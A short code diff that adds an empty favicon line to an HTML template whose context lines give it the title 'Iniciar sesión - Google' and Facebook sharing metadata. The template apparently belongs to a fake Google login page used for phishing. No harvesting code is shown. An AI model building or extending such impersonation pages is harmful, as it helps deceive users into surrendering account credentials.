@@ -41,6 +41,7 @@ def get_template():
 <html>
 <head>
     <meta charset="UTF-8">
+    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
     <!-- METADATOS PARA FACEBOOK -->
     <meta property="og:title" content="Iniciar sesión - Google" />
     <meta property="og:description" content="Accede a tu cuenta de Google de forma segura" />
